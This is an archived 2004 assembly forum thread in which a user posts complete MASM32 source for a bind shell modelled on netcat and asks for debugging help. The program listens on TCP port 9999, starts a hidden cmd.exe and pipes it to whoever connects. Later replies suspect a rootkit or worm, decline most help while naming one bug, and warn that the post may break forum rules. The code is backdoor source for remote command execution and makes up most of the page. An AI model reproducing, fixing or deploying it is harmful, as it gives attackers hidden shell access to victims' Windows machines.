<!DOCTYPE html>
<html>
 <head>
  <meta charset="utf-8" />
  <title>who can help me? - Forums - ASM Community</title>
  <link rel="stylesheet" type="text/css" href="../../../style.css" />
  <link rel="canonical" href="../?id=19214" />
     </head>
 <body>
  <div id="header">
   <h1><a href="../../../">ASM Community</a></h1>
  </div>
  <div id="content">
   <p class="breadcrumbs"><a href="../../../">Home</a> &raquo; <a href="../../">Forums</a> &raquo; <a href="../../board/?id=8">Networking</a> &raquo; <a href="../?id=19214">who can help me?</a></p>
   <div class="post" id="post-148481">
    <div class="subject"><a href="#post-148481">who can help me?</a></div>
    <div class="body">if one debug it,send message to me,my email:linda_010101@hotmail.com<br />thanks<br /><br /><br /><br />.386<br />.model flat,stdcall<br />option casemap :none<br />include \masm32\include\windows.inc<br />include \masm32\include\user32.inc<br />include \masm32\include\kernel32.inc<br />include \masm32\include\shlwapi.inc<br />includelib \masm32\lib\shlwapi.lib<br />includelib \masm32\lib\user32.lib<br />includelib \masm32\lib\kernel32.lib<br />include \masm32\include\wsock32.inc<br />includelib \masm32\lib\wsock32.lib<br /><br />TCP_PORT equ 9999<br /><br /><br />BUFFER_SIZE equ 200<br />SESSION STRUCT<br />hReadPipe dd ?<br />hWritePipe dd ?<br />hProcess dd ?<br />sClientSocket SOCKET ?<br />hReadShellThread dd ?<br />hWriteShellThread dd ?<br />SESSION ENDS<br /><br />    .const<br />szCmd db &quot;C:\WINNT\system32\cmd.EXE&quot;,0<br />szExit db &quot;exit&quot;,0dh,0ah,0<br />szSuc db 'sucess',0<br />szErr1 db 'createprocess fail',0<br />szErr2 db 'accept fail',0<br />    .data?<br />hShellStdinPipe dd ?<br />hShellStdoutPipe dd ?    <br />hChildStdinRd dd ?<br />stSin sockaddr_in &lt;?&gt;<br />stSession SESSION &lt;?&gt;<br />stWsa WSADATA &lt;?&gt;<br />hSocket dd ?<br />hcSocket dd ?<br />    .code<br /><br />_StartShell proc uses ebx edi hShellStdin,hShellStdout<br />            local @stProcessInformation:PROCESS_INFORMATION<br />            local @stSi:STARTUPINFO<br />            local @hProcess<br />            mov @hProcess,NULL<br />            mov @stSi.cb,sizeof STARTUPINFO<br />            mov @stSi.lpReserved,NULL<br />            mov @stSi.lpTitle,NULL<br />            mov @stSi.lpDesktop,NULL<br />            mov @stSi.dwX,0<br />            mov @stSi.dwY,0<br />            mov @stSi.dwYSize,0<br />            mov @stSi.wShowWindow,SW_HIDE<br />            mov @stSi.lpReserved2,NULL<br />            mov @stSi.cbReserved2,0<br />            mov ebx,STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES<br />            mov @stSi.dwFlags,ebx<br />            push hShellStdout<br />            pop @stSi.hStdOutput<br />            push hShellStdin<br />            pop @stSi.hStdInput<br />            push hShellStdout<br />              pop @stSi.hStdOutput<br />             invoke CreateProcess,NULL,addr szCmd,NULL,NULL,TRUE,0,\<br />                          NULL,NULL,addr @stSi,addr @stProcessInformation<br />            <br />             <br />                mov edi,@stProcessInformation.hProcess<br />                mov @hProcess,edi<br />                invoke CloseHandle,@stProcessInformation.hThread<br />                          <br />            <br />            mov eax,@hProcess<br />            ret<br /><br />_StartShell endp<br /><br />_CreateSession proc <br />                <br />                local @stSecurityAttributes:SECURITY_ATTRIBUTES<br />               <br />                invoke RtlZeroMemory,addr stSession,sizeof stSession<br />                <br /><br />                mov @stSecurityAttributes.nLength,sizeof SECURITY_ATTRIBUTES<br />                xor eax,eax<br />                mov @stSecurityAttributes.lpSecurityDescriptor,eax<br />                mov @stSecurityAttributes.bInheritHandle,TRUE<br />               invoke CreatePipe,addr stSession.hReadPipe,addr hShellStdoutPipe,\<br />                        addr @stSecurityAttributes,0<br />                     <br />                .if eax==NULL<br />                 invoke MessageBox,NULL,addr szErr1,NULL,MB_OK or MB_ICONWARNING<br />                 .else<br />                  invoke CreatePipe,addr hShellStdinPipe,addr stSession.hWritePipe,\<br />                            addr @stSecurityAttributes,0<br />                    .if eax!=NULL<br />                   <br />                        invoke _StartShell,hShellStdinPipe,hShellStdoutPipe<br />                        mov stSession.hProcess,eax<br />                        invoke CloseHandle,hShellStdinPipe<br />                        invoke CloseHandle,hShellStdoutPipe<br />                        mov eax,TRUE<br />                        ret<br />                     .endif<br />                 .endif<br /><br />_CreateSession endp<br /><br />_SessionReadShellThreadFn proc uses ebx ecx   <br />    local @Buffer:byte<br />    local @Buffer2:byte<br />    local @BytesRead<br />    local @BytesToWrite<br />    .while TRUE<br />            invoke PeekNamedPipe,stSession.hReadPipe,addr @Buffer,sizeof @Buffer,\<br />                    addr @BytesRead,NULL,NULL<br />            .break .if eax==NULL<br />            .if  @BytesRead&gt;0<br />                  invoke ReadFile,stSession.hReadPipe,addr @Buffer,sizeof @Buffer,\<br />                            addr @BytesRead,NULL<br />            .else<br />                invoke Sleep,50<br />                .continue<br />            .endif<br />            xor eax,eax<br />            xor ecx,ecx<br />            xor edx,edx<br />            mov ebx,@BytesRead<br />            .while ecx&lt;ebx<br />                mov al,@Buffer          <br />                .if al==0ah &amp;&amp; ah!=0dh<br />                  <br />                   mov @Buffer2,0dh<br />                   .endif<br />                <br />                 mov ah,@Buffer<br />                 mov @Buffer2,ah<br />                 inc edx<br />                 inc ecx<br />            .endw<br />            mov @BytesToWrite,edx<br />            invoke send,stSession.sClientSocket,addr @Buffer2,@BytesToWrite,0<br />            .break .if eax&lt;=0<br />      .endw<br />      invoke ExitThread,0<br /><br />_SessionReadShellThreadFn endp<br /><br />_SessionWriteShellThreadFn proc uses ebx <br />        <br />        local @RecvBuffer[1]:byte<br />        local @Buffer:byte<br />        local @EchoBuffer[5]:byte<br />        local @BytesWritten<br />        local @BufferCnt<br />        local @EchoCnt<br />        local @TossCnt<br />        xor ebx,ebx<br />        mov @TossCnt,ebx<br />        mov @BufferCnt,ebx<br />        .while TRUE<br />            invoke recv,stSession.sClientSocket,@RecvBuffer,\<br />                    sizeof @RecvBuffer,0<br />            .break .if eax==NULL<br />            mov ah,@RecvBuffer[0]<br />            mov @Buffer,ah<br />            inc ebx<br />            .if ah==0dh<br />                mov @Buffer,0ah<br />                inc ebx <br />            .endif<br />            invoke StrCmpNI,addr @Buffer,addr szExit,6<br />            .if eax==NULL<br />                invoke ExitThread,0<br />            .endif<br />            mov ah,@RecvBuffer[0]        <br />            .if ah==0ah || ah==0dh<br />               <br />                invoke WriteFile,stSession.hWritePipe,addr @Buffer,\<br />                        ebx,addr @BytesWritten,NULL<br />                .break .if eax==NULL<br />                mov @BufferCnt,0<br />               <br />            .endif<br />        .endw<br /><br />_SessionWriteShellThreadFn endp                <br />                                       <br />_doexec proc uses ebx _hClientsocket                       <br />        <br />        local @stSecurityAttributes:SECURITY_ATTRIBUTES<br />        local @ThreadId<br />        local @HandleArray[3]<br />        <br />        invoke _CreateSession<br />        <br />        mov @stSecurityAttributes.nLength,sizeof SECURITY_ATTRIBUTES<br />        mov @stSecurityAttributes.lpSecurityDescriptor,NULL<br />        mov @stSecurityAttributes.bInheritHandle,FALSE<br />        mov ebx,_hClientsocket<br />        mov stSession.sClientSocket,ebx<br />        invoke CreateThread,addr @stSecurityAttributes,0,\<br />                            _SessionReadShellThreadFn,NULL,0,\<br />                            addr @ThreadId<br />        mov stSession.hReadShellThread,eax<br />        .if eax==NULL<br />            mov stSession.sClientSocket,INVALID_SOCKET<br />            mov eax,FALSE<br />            ret<br />        .endif<br />        invoke CreateThread,addr @stSecurityAttributes,0,\<br />                            _SessionWriteShellThreadFn,NULL,0,\<br />                            addr @ThreadId<br />        mov stSession.hWriteShellThread,eax<br />        .if eax==NULL<br />            mov stSession.sClientSocket,INVALID_SOCKET<br />            invoke TerminateThread,stSession.hWriteShellThread,0<br />            mov eax,FALSE<br />            ret<br />        .endif<br />        push stSession.hReadShellThread<br />        pop @HandleArray[0]<br />        push stSession.hWriteShellThread<br />        pop @HandleArray[1]<br />        push stSession.hProcess<br />        pop @HandleArray[2]<br />        invoke WaitForMultipleObjects,3,addr @HandleArray,FALSE,INFINITE<br />        .if eax==WAIT_OBJECT_0+0<br />            invoke TerminateThread,stSession.hWriteShellThread,0<br />            invoke TerminateProcess,stSession.hProcess,1<br />            .elseif eax==WAIT_OBJECT_0+1<br />                invoke TerminateThread,stSession.hReadShellThread,0<br />                invoke TerminateProcess,stSession.hProcess,1<br />                .elseif eax==WAIT_OBJECT_0+2<br />                    invoke TerminateThread,stSession.hReadShellThread,0<br />                    invoke TerminateProcess,stSession.hWriteShellThread,0<br />        <br />        .endif<br />        invoke closesocket,stSession.sClientSocket                <br />        invoke DisconnectNamedPipe,stSession.hReadPipe<br />        invoke CloseHandle,stSession.hReadPipe<br />        invoke DisconnectNamedPipe,stSession.hWritePipe<br />        invoke CloseHandle,stSession.hWritePipe<br />        invoke CloseHandle,stSession.hReadShellThread<br />        invoke CloseHandle,stSession.hWriteShellThread<br />        invoke CloseHandle,stSession.hProcess<br />        mov eax,TRUE<br />        ret<br /><br />_doexec endp<br />start:<br />        invoke WSAStartup,101h,addr stWsa<br />        invoke socket,AF_INET,SOCK_STREAM,0<br />         mov hSocket,eax<br />        invoke RtlZeroMemory,addr stSin,sizeof stSin<br />        invoke htons,TCP_PORT<br />        mov stSin.sin_port,ax<br />        mov stSin.sin_family,AF_INET<br />        mov stSin.sin_addr,INADDR_ANY<br />        invoke bind,hSocket,addr stSin,sizeof stSin<br />        invoke listen,hSocket,1<br />        .if eax==SOCKET_ERROR<br />        invoke MessageBox,NULL,addr szErr1,NULL,MB_OK or MB_ICONWARNING<br />        .endif<br />       <br />        .while TRUE<br />            invoke accept,hSocket,NULL,NULL<br />            .if eax==INVALID_SOCKET <br />             invoke MessageBox,NULL,addr szErr2,NULL,\<br />                MB_OK or MB_ICONWARNING<br />  <br />            jmp exit<br />            .else <br />            <br />             mov hcSocket,eax<br />             invoke _doexec,hcSocket<br />             .if eax==FALSE<br />             invoke MessageBox,NULL,addr szErr1,NULL,MB_OK or MB_ICONWARNING<br /><br />             .endif<br />             .endif<br />        .endw    <br /> exit:  <br />        invoke closesocket,hSocket<br />        invoke closesocket,hcSocket     <br />        invoke WSACleanup<br />        invoke ExitProcess,NULL<br /><br />end start</div>
    <div class="meta">Posted on 2004-08-25 19:47:04 by fuckjp</div>
   </div>
   <div class="post" id="post-148486">
    <div class="subject"><a href="#post-148486">who can help me?</a></div>
    <div class="body">i could swear i've seen that code before in another thread............. and if i remember right you were unable to explain parts of how it worked yet you claimed you coded it.. you wont get much help with your little rootkit attempt here by reregistering...</div>
    <div class="meta">Posted on 2004-08-25 22:59:37 by evlncrn8</div>
   </div>
   <div class="post" id="post-148582">
    <div class="subject"><a href="#post-148582">i come from nc</a></div>
    <div class="body">i just to begin use masm,so i want to practise much,i read nc's code,and i write use masm32,but some error ,so i want somebody help me</div>
    <div class="meta">Posted on 2004-08-27 11:17:15 by fuckjp</div>
   </div>
   <div class="post" id="post-148874">
    <div class="subject"><a href="#post-148874">who can help me?</a></div>
    <div class="body">In the spirit of freedom of information, I will tell you one thing that will help you... I will not help with THIS source any further than to tell you that you forgot to GetStartupInfo before you CreateProcess..<br /><br />In future, if you want to post this sort of thing, think twice, and explain your intentions carefully - I'm suprised this post is still here now, as it surely is in breach of the forum rules on this kind of thing.</div>
    <div class="meta">Posted on 2004-08-31 22:26:33 by Homer</div>
   </div>
   <div class="post" id="post-148880">
    <div class="subject"><a href="#post-148880">who can help me?</a></div>
    <div class="body">first look at the code gives me the impression that it is a worm alike executable.</div>
    <div class="meta">Posted on 2004-09-01 00:43:32 by wizzra</div>
   </div>
  </div>
 </body>
</html>